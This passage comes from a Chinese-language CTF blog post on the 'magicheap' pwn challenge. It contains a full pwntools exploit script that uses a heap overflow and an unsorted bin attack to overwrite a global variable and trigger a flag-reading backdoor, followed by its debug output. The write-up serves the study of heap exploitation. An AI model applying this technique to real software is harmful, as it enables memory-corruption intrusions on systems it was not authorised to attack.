class="line">context(os=<span class="string">&quot;linux&quot;</span>,arch=<span class="string">&quot;amd64&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;splitw&quot;</span>, <span class="string">&quot;-h&quot;</span>]</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./magicheap&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">size, content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;Your choice :&quot;</span>, <span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Size of Heap :&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Content of heap:&quot;</span>)</span><br><span class="line">    io.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, size, content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;Your choice :&quot;</span>, <span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Index :&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Size of Heap :&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Content of heap :&quot;</span>)</span><br><span class="line">    io.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;Your choice :&quot;</span>, <span class="string">b&quot;3&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Index :&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">backdoor</span>():</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;Your choice :&quot;</span>, <span class="string">b&quot;4869&quot;</span>)</span><br><span class="line"></span><br><span class="line">magic = <span class="number">0x6020c0</span></span><br><span class="line"></span><br><span class="line">create(<span class="number">0x100</span>, <span class="string">b&quot;A&quot;</span>*<span class="number">0x10</span>) <span class="comment"># 0 # 制造溢出</span></span><br><span class="line">create(<span class="number">0x100</span>, <span class="string">b&quot;B&quot;</span>*<span class="number">0x10</span>) <span class="comment"># 1 # attacked</span></span><br><span class="line">create(<span class="number">0x100</span>, <span class="string">b&quot;C&quot;</span>*<span class="number">0x10</span>) <span class="comment"># 2 # 防止Top chunk合并</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>) <span class="comment"># 释放1，进入 unsorted bin</span></span><br><span class="line">edit(<span class="number">0</span>, <span class="number">0x120</span>, <span class="string">b&quot;A&quot;</span>*<span class="number">0x100</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x111</span>) + p64(magic) + p64(magic-<span class="number">16</span>)) <span class="comment"># 修改1的bk，准备unsorted bin attack</span></span><br><span class="line"></span><br><span class="line">create(<span class="number">0x100</span>, <span class="string">b&quot;D&quot;</span>*<span class="number">0x10</span>) <span class="comment"># 3 # 再次分配，触发unsorted bin attack，修改magic的值为 main_arena + offset</span></span><br><span class="line"></span><br><span class="line">backdoor() <span class="comment"># 触发调用l33t()，执行 cat /flag</span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>执行结果如下（此处我没有放flag文件）：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Your choice :$ 4869</span><br><span class="line">[DEBUG] Sent 0x5 bytes:</span><br><span class="line">    b&#x27;4869\n&#x27;</span><br><span class="line">[DEBUG] Received 0x9 bytes:</span><br><span class="line">    b&#x27;Congrt !\n&#x27;</span><br><span class="line">[DEBUG] Received 0x27 bytes:</span><br><span class="line">    b&#x27;cat: ./flag: No such file or directory\n&#x27;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/pwn/" rel="tag"># pwn</a>
+              <a href="/tags/ctf/" rel="tag"># ctf</a>
+              <a href="/tags/heap-overflow/" rel="tag"># heap-overflow</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2026/05/02/2026-05-02-Fastbin-Attack/" rel="prev" title="学习笔记：Fastbin Attack">
+                  <i class="fa fa-angle-left"></i> 学习笔记：Fastbin Attack
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2026/08/19/hello-world/" rel="next" title="Hello World">
+                  Hello World <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2026</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder"></span>
+  </div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="Total Visitors">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="Total Views">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="Back to top">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+</body>
+</html>
